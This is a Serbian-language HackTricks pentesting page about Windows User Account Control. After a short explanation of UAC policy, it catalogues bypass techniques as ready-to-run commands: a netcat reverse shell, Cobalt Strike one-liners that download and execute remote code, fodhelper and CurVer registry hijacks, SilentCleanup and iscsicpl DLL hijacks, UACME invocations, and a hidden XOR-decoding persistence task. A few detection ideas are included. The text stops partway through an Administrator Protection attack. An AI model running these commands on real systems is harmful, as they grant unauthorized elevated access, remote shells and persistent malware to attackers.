# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu aktivnosti sa povišenim privilegijama**. Aplikacije imaju različite nivoe `integriteta`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da te aplikacije/zadaci dobiju pristup sistemu na nivou administratora. To je praktična funkcija koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisniku administratoru se dodeljuju 2 tokena: token standardnog korisnika za izvršavanje uobičajenih radnji sa srednjim nivoom integriteta i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfigurisanje načina rada UAC-a specifičnog za svoju organizaciju na lokalnom nivou (korišćenjem secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja detaljno su opisana [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 Group Policy podešavanja. Sledeća tabela pruža dodatne informacije:

| Group Policy podešavanje                                                                                                                                                                                                                                                                                                                                                           | Registry ključ                | Podrazumevano podešavanje                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola korisničkog naloga: Režim odobrenja administratora za ugrađeni Administrator nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Ponašanje zahteva za povećanje privilegija za administratore u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za potvrdu za ne-Windows binarne datoteke na bezbednoj radnoj površini) |
| [Kontrola korisničkog naloga: Ponašanje zahteva za povećanje privilegija za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za kredencijale na bezbednoj radnoj površini)         |
| [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i zahtev za povećanje privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u Enterprise izdanju)           |
| [Kontrola korisničkog naloga: Povećanje privilegija samo za izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Povećanje privilegija samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Pokretanje svih administratora u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Dozvola UIAccess aplikacijama da zahtevaju povećanje privilegija bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Prebacivanje na bezbednu radnu površinu prilikom zahteva za povećanje privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Virtuelizacija neuspešnih upisa u datoteke i registry na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Politike za instaliranje softvera na Windows-u

**Lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry ključevi za prisiljavanje UAC-a da zahteva povećanje privilegija

Kao standardni korisnik bez administratorskih prava, možete da obezbedite da se od „standardnog“ naloga **zahtevaju kredencijali putem UAC-a** kada pokuša da izvrši određene radnje. Za ovu radnju potrebno je izmeniti određene **registry ključeve**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako se korisnik nalazi u grupi **Administrators**, ove izmene primoravaju korisnika da **ponovo unese kredencijale svog naloga** kako bi izvršio administrativne radnje.

**U praksi, ovo je korisno samo kada već imate token sa povišenim privilegijama, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom, sam upis u registry biće blokiran.**

Registry ključevi i vrednosti koje morate da izmenite su sledeći (sa podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno putem alata Local Security Policy. Nakon izmene, administrativne operacije zahtevaju od korisnika da ponovo unese svoje kredencijale.

### Napomena

**Kontrola korisničkog naloga nije bezbednosna granica.** Zbog toga standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez exploita za lokalnu eskalaciju privilegija.

### Zatražite od korisnika „potpun pristup računaru“
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla privremenih Internet datoteka). To se postiže pokretanjem pregledača sa tokenom niskog nivoa integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog nivoa integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskim izvršavanjem koda da pristupe osetljivim podacima na sistemu.
- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži spisak privilegija korisnika. Privilegije su definisane kao kombinacija prava i mogućnosti korisnika. Token takođe sadrži spisak korisnikovih akreditiva, odnosno akreditiva koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows da automatski prijavi određenog korisnika pri pokretanju sistema, postavite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili u svrhe testiranja. Koristite ovu opciju samo na bezbednim sistemima, jer lozinku izlaže u registry-ju.

Podesite sledeće ključeve pomoću Registry Editora ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili uobičajeno ponašanje pri prijavljivanju, postavite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je UAC bypass jednostavan ako imate grafički pristup žrtvi, jer možete jednostavno kliknuti na „Yes“ kada se pojavi UAC prompt.

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je podešen na najviši nivo bezbednosti (Always), nego ako je podešen na bilo koji od ostalih nivoa (Default).**

### Brza trijaža iz shell-a sa srednjim nivoom integriteta

Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i povežite build hosta sa poznatim metodama koje funkcionišu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktične napomene:
- Ako je `EnableLUA=0`, bypass vam nije potreban: bilo koji admin token može direktno da zatraži high integrity.
- `ConsentPromptBehaviorAdmin=2` ili `5` predstavlja uobičajeni scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže nivo zaštite, ali i dalje treba testirati konkretnu build verziju umesto pretpostavke da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows build verzijama.<sup>[[3]](#references)</sup>

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa administratorskim privilegijama** (nivo visokog integriteta) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass sa dupliciranjem tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovni UAC „bypass“ (potpuni pristup sistemu datoteka)

Ako imate shell sa korisnikom koji je u grupi Administrators, možete **mount-ovati C$** deljen putem SMB-a (sistem datoteka) lokalno na novom disku i imaćete **pristup svemu unutar sistema datoteka** (čak i matičnom folderu Administratora).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass sa Cobalt Strike

Cobalt Strike tehnike će funkcionisati samo ako UAC nije podešen na najviši nivo bezbednosti
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Povišeni COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objekti ostaju praktična UAC površina na modernim buildovima. `ICMLuaUtil` se i dalje vodi u UACME-u kao funkcionalan na aktuelnim Windows granama, a offensive alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnoj radnoj površini, 64-bitnog izvršavanja i ponekad maskiranja PEB-a/procesa pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom child procesu).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
- Očekujte da se izvršavanje child procesa odvija u **zasebnom povišenom procesu**; mnogi BOF-ovi ne podižu privilegije trenutnog beacon-a in-place.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit-i za UAC bypass

[**UACME**](https://github.com/hfiref0x/UACME) je kolekcija tehnika za UAC bypass. Kompajlirajte ga pomoću Visual Studio-a ili MSBuild-a; build kreira nekoliko izvršnih datoteka (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), zato izaberite metod koji odgovara ciljnom buildu.<sup>[[3]](#references)</sup>\
Budite oprezni: neki bypass-i pokreću vidljive programe ili prompt-ove koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>

UACME sadrži **build verziju od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu, iz verzija buildova dobijate Windows izdanje `1607`.

Praktičan tok rada je da najpre **procenite build hosta**, a tek zatim pokrenete odgovarajući metod:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` brzo poredi lokalni build sa poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` ostaje najbolji javni katalog za povezivanje bypass-a sa preciznim build-om. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i release notes umesto da pretpostavite da stari PoC i dalje nepromenjeno funkcioniše.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess lanci kompatibilni sa Always Notify (UACME 3.7.1)

`Always Notify` ne eliminiše svaki UAC bypass. UACME 3.7.1 implementira tri nove x64 metode koje kombinuju stanje okruženja/protokola pod kontrolom korisnika sa ponašanjem elevated scheduled task-a ili UIAccess-a i sve ih označava kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` navede elevated `taskhostw.exe` da side-load-uje `unifiedconsent.dll`. UACME ga prati od Windows 10 build 19041.
- **84 — TabTip:** upotrebite isti primitive sa environment varijablom protiv UIAccess `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od build-a, a zatim pređite iz dobijenog high-integrity UIAccess konteksta. UACME ga prati od Windows 8.1 / Server 2016.
- **85 — Narrator:** preotmite per-user `feedback-hub` protokol, pokrenite Narrator pomoću `Alt+CapsLock+F`, a zatim pokrenite writable kopiju `osk.exe` koja side-load-uje `OskSupport.dll`. Ovo zahteva interactive desktop i prati se od Windows 10 1809 / Server 2019.

Nakon izgradnje payload jedinica i Akagi-ja prema dokumentaciji UACME-a, pozovite odgovarajući broj metode (opciona komanda podrazumevano koristi `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Metode 84 i 85 zavise od UIAccess/desktop interaction, zato ne očekujte da rade neizmenjene iz Session 0 ili neinteraktivnog service shell-a. Sve tri metode menjaju stanje okruženja/protokola i pripremaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binary `fodhelper.exe` ima auto-elevated privilegije na modernim Windows sistemima. Prilikom pokretanja, on upituje putanju per-user registry-ja navedenu u nastavku bez validacije `DelegateExecute` glagola. Postavljanje komande na toj lokaciji omogućava procesu sa Medium Integrity nivoom (korisnik je član grupe Administrators) da pokrene proces sa High Integrity nivoom bez UAC prompta.

Registry putanja koju upituje fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (podesite svoj payload, zatim ga aktivirajte)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Radi kada je trenutni korisnik član grupe Administrators, a nivo UAC-a je podrazumevani/blagi (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Izbegavajte UI prozore koji zahtevaju interakciju radi stealth-a.

#### Varijanta CurVer/extension hijack-a (samo HKCU)

Noviji primerci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` po korisniku. Binarna datoteka sa automatski podignutim privilegijama i dalje razrešava handler pod `HKCU`, tako da nije potreban admin token za postavljanje ključeva:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nakon eskalacije privilegija, malware često **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatni defense evasion (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao sa high integrity. Tipičan persistence zadatak čuva **XOR-enkriptovanu PowerShell skriptu** na disku i dekodira/izvršava je u memoriji svakog sata:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, zbog čega se detekcija oslanja na praćenje **`CurVer` hijack-a**, menjanje vrednosti `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass preko `SilentCleanup` task-a (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti high integrity bez consent dijaloga.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim buildovima jer UACME održava tehniku aktivnom, a nedavno praćenje problema pokazuje da Windows 11 24H2 možda zahteva samo male izmene navodnika.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ako zadatak navodi putanju u toj verziji, ponovite pokušaj sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek očistite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass metoda

Mnoge klasične UAC bypass metode koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **potpunu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **proces** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload - Još UAC bypass metoda: To možete dobiti pomoću meterpreter sesije. Migrirajte u proces čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno za zaobilaženje praktičnih poteškoća koje UAC uvodi.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa odatle možete **pokrenuti** na primer **cmd** direktno **kao admin**, bez ponovnog prikazivanja UAC prompta, kao kod alata [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto **stealthy**.

### Bučni brute-force UAC bypass

Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može uzastopno zahtevati elevation dok ga korisnik ne prihvati.

### Sopstveni bypass - Osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnogi UAC bypass-ovi zloupotrebljavaju DLL hijacking** (često tako što nateraju elevated binary da učita DLL pod kontrolom napadača iz putanje sa dozvolom upisivanja). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji će se **autoelevate** (proverite da se prilikom izvršavanja pokreće na nivou visokog integriteta).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32), gde nemate dozvole za upisivanje. Ovo možete zaobići pomoću:
1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (zato što se ovaj alat izvršava sa visokog nivoa integriteta).
2. **IFileOperation**: Windows 10.
4. Pripremite **script** za kopiranje vašeg DLL-a unutar zaštićene putanje i izvršavanje ranjivog i autoelevated binary-ja.

### Druga UAC bypass tehnika

Sastoji se u praćenju da li **autoElevated binary** pokušava da iz **registry-ja** **pročita** **ime/putanju** **binary-ja** ili **komande** koju treba **izvršiti** (ovo je zanimljivije ako binary traži ove informacije unutar **HKCU**).

### UAC bypass preko `SysWOW64\iscsicpl.exe` + DLL hijack korisničkog `PATH`-a

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete postaviti zlonamerni `iscsiexe.dll` unutar fascikle u koju **korisnik može da upisuje**, a zatim izmeniti `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se ta fascikla pretražuje, Windows može učitati DLL napadača unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada je trenutni korisnik u grupi **Administrators**, ali radi na nivou **Medium Integrity** zbog UAC-a.
- Kopija u fascikli **SysWOW64** relevantna je za ovaj bypass. Kopiju u fascikli **System32** tretirajte kao zaseban binary i nezavisno proverite njeno ponašanje.
- Primitiv kombinuje **auto-elevation** i **DLL search-order hijacking**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass metode koristan za proveru učitavanja DLL-a koji nedostaje.

Minimalni tok:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideje za detekciju:
- Upozorite na `reg add` / upise u registry vrednosti `HKCU\Environment\Path` koje neposredno prati izvršavanje `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražite `iscsiexe.dll` na lokacijama koje **kontroliše korisnik**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Povežite pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi proveriti zasebno

Neki lanci nakon 2024. više ne izgledaju kao klasični registry hijack napadi nad `HKCU\Software\Classes`. Na primer, poisoning activation-context cache-a može da poveže **preusmeravanje diska** i **DLL redirection** kako bi se sa srednjeg nivoa integriteta prešlo na visoki integritet kroz pouzdane UI / auto-elevated binarne fajlove kao što su `ctfmon.exe`, a kasnije i mete poput `fodhelper.exe`. Umesto dupliciranja velikog PoC-a ovde, proverite sažete primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack putem DOS device mape po logon sesiji

> [!NOTE]
> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje iz oktobra 2025. je poništeno i planirano za kasniji datum. Pre testiranja ovih lanaca potvrdite da je **Admin Approval Mode with Administrator protection** zaista omogućen i da je uređaj restartovan; sam broj verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>

Za kompletnu napadnu površinu `RAiLaunchAdminProcess` / UIAccess na preview buildovima Windows 11 25H2, pogledajte namensku stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se lenjo kreira pomoću `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač impersonira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **owner** (nasleđuje `CREATOR OWNER`), čime se omogućavaju linkovi slova diskova koji imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da biste pokrenuli promptless shadow-admin `runonce.exe`.
2. Duplirajte njegov primarni token u **identification** token i impersonirajte ga dok otvarate `\??`, kako biste prinudno kreirali `\Sessions\0\DosDevices/<LUID>` pod vlasništvom napadača.
